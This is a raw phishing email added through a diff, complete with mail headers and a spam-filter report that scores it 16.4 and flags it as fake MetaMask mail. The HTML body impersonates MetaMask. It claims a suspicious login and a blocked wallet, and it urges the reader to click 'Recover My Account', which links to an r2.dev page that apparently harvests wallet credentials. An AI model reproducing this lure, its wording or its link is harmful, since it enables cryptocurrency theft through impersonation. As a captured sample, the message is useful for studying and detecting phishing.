@@ -1,0 +1,273 @@
+Return-Path: <digressed@familyh.com>
+Delivered-To: info+spam@go-onriders.com
+Received: from rin6.dizinc.com
+	by rin6.dizinc.com with LMTP
+	id bEBKO90/nGbKTR0AQ+45pw
+	(envelope-from <digressed@familyh.com>)
+	for <info+spam@go-onriders.com>; Sat, 20 Jul 2024 18:53:17 -0400
+Return-path: <digressed@familyh.com>
+Envelope-to: info@go-onriders.com
+Delivery-date: Sat, 20 Jul 2024 18:53:18 -0400
+Received: from host.virtualaccesssolutions.com ([50.28.98.18]:59892)
+	by rin6.dizinc.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.97.1)
+	(envelope-from <digressed@familyh.com>)
+	id 1sVIx6-000000083Tj-3Rn1
+	for info@go-onriders.com;
+	Sat, 20 Jul 2024 18:53:17 -0400
+Received: from [108.165.237.164] (port=63665)
+	by host.virtualaccesssolutions.com with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96.2)
+	(envelope-from <digressed@familyh.com>)
+	id 1sVIwZ-0002DU-1m
+	for info@go-onriders.com;
+	Sat, 20 Jul 2024 18:52:36 -0400
+From: "=?UTF-8?B?TWV0YU1hc2s=?=" <digressed@familyh.com>
+To: info@go-onriders.com
+Date: 20 Jul 2024 15:52:35 -0700
+Message-ID: <20240720155235.C41830F92362B7F5@familyh.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - host.virtualaccesssolutions.com
+X-AntiAbuse: Original Domain - go-onriders.com
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - familyh.com
+X-Get-Message-Sender-Via: host.virtualaccesssolutions.com: authenticated_id: digressed@familyh.com
+X-Authenticated-Sender: host.virtualaccesssolutions.com: digressed@familyh.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-MagicSpam-TUUID: 596f75c5-a9f5-490f-aed7-ead69ff55575
+X-MagicSpam-SUUID: 4b58810f-9f6a-465c-b4f6-f43632aca88e
+X-Spam-Status: Yes, score=16.4
+X-Spam-Score: 164
+X-Spam-Bar: ++++++++++++++++
+X-Spam-Report: Spam detection software, running on the system "rin6.dizinc.com",
+ has identified this incoming email as possible spam.  The original
+ message has been attached to this so you can view it or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ Content preview:  Important Notice Dear Customer, We noticed that someone just
+    tried to log in to your MetaMask from location you have not used before,
+   so we want to make sure it's really you. 
+ Content analysis details:   (16.4 points, 5.0 required)
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.3 LM_MSGID_STYLE_POSTFIX3 Message ID associated with Postfix
+                             sender
+  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
+                             query to Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                             [50.28.98.18 listed in bl.score.senderscore.com]
+  0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
+                             The query to Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                             [50.28.98.18 listed in sa-accredit.habeas.com]
+ -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
+ -0.0 SPF_PASS               SPF: sender matches SPF record
+  0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  1.5 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+                             [cf: 100]
+  3.0 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
+  2.0 PYZOR_CHECK            Listed in Pyzor
+                             (https://pyzor.readthedocs.io/en/latest/)
+  0.2 LM_FROM_MISMATCH_METAMASK Headers suggest a fake Metamask email.
+  0.0 FROM_EXCESS_BASE64     From: base64 encoded unnecessarily
+  0.0 KAM_DMARC_STATUS       Test Rule for DKIM or SPF Failure with Strict
+                             Alignment
+  1.0 LM_CONSEQUENCE_PHISHY  Email contains a phrase seen in past
+                             phishing emails, e.g., failure to act will
+                              result in account closure.
+  0.0 FSL_BULK_SIG           Bulk signature with no Unsubscribe
+  0.4 LM_DEAR_GENERIC_TITLE  Generic Dear sometitle commonly seen in
+                             spam
+  3.5 LM_METAMASK_PHISH6     Metamask phishing, mentions a temporary block
+                              and encourages the victim to take
+                             immediate action
+  4.3 LM_PHISH_EMAIL_META92  OS generated, from admin. Fake new
+                             message/low storage/verify account email
+                             with a risky link.
+X-Spam-Flag: YES
+Subject:  ***SPAM***  =?UTF-8?B?WW91ciBNZXRhTWFzayB3YWxsZXQgd2lsbCBiZSBzdXNwZW5kZWQu?=
+
+<!DOCTYPE html>
+
+<html lang=3D"en"><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta charset=3D"UTF-8">
+    <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=
+=3D1.0">
+    <title>Important Notice</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+
+        .email-container {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+
+        .ledger-logo {
+            display: block;
+            margin: 0 auto 10px;
+            max-width: 200px;
+        }
+
+        .email-header {
+            text-align: center;
+            border-bottom: 1px solid #e8e8e8;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .email-content p {
+            line-height: 1.7;
+            color: #333;
+            font-size: 16px;
+            margin: 16px 0;
+        }
+
+        .alert-text {
+            background-color: #FFEBEB;
+            padding: 10px;
+            margin: 20px 0;
+            border: 1px solid #FF5300;
+            border-radius: 5px;
+            color: #d93a00;
+        }
+
+        .recover-button {
+            display: block;
+            width: 100%;
+            max-width: 250px;
+            margin: 30px auto;
+            text-align: center;
+            padding: 10px 15px;
+            background-color: #FF5300;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: background-color 0.3s;
+        }
+
+        .recover-button:hover, .recover-button:focus {
+            background-color: #d93a00;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        /* Media Queries for Responsiveness */
+        @media screen and (max-width: 640px) {
+            .email-container {
+                padding: 15px;
+            }
+
+            .ledger-logo {
+                max-width: 150px;
+            }
+
+            .email-header h2 {
+                font-size: 20px;
+            }
+        }
+
+    </style>
+</head>
+
+<body style=3D"font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0">
+    <div style=3D"max-width: 600px;
+            margin: 20px auto;
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05)" class=3D"email-cont=
+ainer">
+        <div style=3D"text-align: center;
+            border-bottom: 1px solid #e8e8e8;
+            padding-bottom: 10px;
+            margin-bottom: 20px" class=3D"email-header">
+
+            <h2><img width=3D"222" height=3D"122" align=3D"middle" style=3D=
+"border-color: rgb(0, 0, 0);" src=3D"https://1000logos.net/wp-content/uploa=
+ds/2022/05/MetaMask-Emblem.png"></h2>
+          <h2><br></h2>
+        </div>
+        <div class=3D"email-content">
+            <p style=3D"line-height: 1.7;
+            color: #333;
+            font-size: 16px;
+            margin: 16px 0">Dear Customer,</p>
+            <p style=3D"line-height: 1.7;
+            color: #333;
+            font-size: 16px;
+            margin: 16px 0">We noticed that someone just tried to log in to=
+ your&nbsp;MetaMask from location you have not used before, so we want to m=
+ake sure it's really you.</p>
+            <div style=3D"background-color: #FFEBEB;
+            padding: 10px;
+            margin: 20px 0;
+            border: 1px solid #FF5300;
+            border-radius: 5px;
+            color: #d93a00" class=3D"alert-text">
+                Your account and your wallet have been temporarily blocked =
+to prevent you from losing&nbsp;your assets.
+            </div>
+            <h3>How can I recover my account?</h3>
+            <ol>
+                <li>Click and follow the instructions to recover your accou=
+nt and unblock it.</li>
+                <li>After completing the process, enable Two-Factor Authent=
+ication.</li>
+            </ol>
+            <a style=3D"display: block;
+            width: 100%;
+            max-width: 250px;
+            margin: 30px auto;
+            text-align: center;
+            padding: 10px 15px;
+            background-color: #FF5300;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: background-color 0.3s" class=3D"recover-button" hre=
+f=3D"https://pub-e2057f5c9c714eb990f30c872299c2fa.r2.dev/index.html">Recove=
+r My Account</a>
+        </div>
+        <div style=3D"font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 40px" class=3D"footer-text">
+            &copy; 2024 MetaMask. All rights reserved.
+        </div>
+    </div>
+
+
+
+</body></html>
